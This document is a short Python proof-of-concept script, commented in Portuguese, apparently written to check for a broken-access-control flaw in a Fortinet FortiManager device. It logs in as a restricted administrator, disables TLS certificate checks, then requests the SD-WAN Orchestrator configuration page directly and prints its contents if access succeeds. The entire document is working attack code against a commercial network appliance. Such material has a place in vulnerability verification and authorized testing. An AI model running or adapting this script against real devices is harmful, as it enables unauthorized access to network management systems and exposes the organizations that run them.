import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Desativa alertas de certificado SSL
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuração da sessão
session = requests.Session()

# URL do FortiManager (modifique com o IP real)
base_url = 'https://192.168.1.100'

# Login do usuário restrito
login_url = f'{base_url}/logincheck'
login_data = {
    'ajax': '1',
    'username': 'restricted_admin',
    'secretkey': 'senha123'  # senha real do usuário restrito
}

# Realiza o login
res = session.post(login_url, data=login_data, verify=False)
if 'error=0' not in res.text:
    print('[!] Falha no login')
    exit()

print('[+] Login bem-sucedido como usuário restrito.')

# Tenta acessar a página restrita diretamente
target_url = f'{base_url}/fortiwan/maintenance/controller_configuration'
res = session.get(target_url, verify=False)

if res.status_code == 200 and "SD-WAN" in res.text:
    print('[+] Acesso indevido confirmado à interface do SD-WAN Orchestrator!')
    print(res.text[:500])  # Mostra os primeiros caracteres da resposta
else:
    print('[!] Acesso negado ou página não encontrada.')
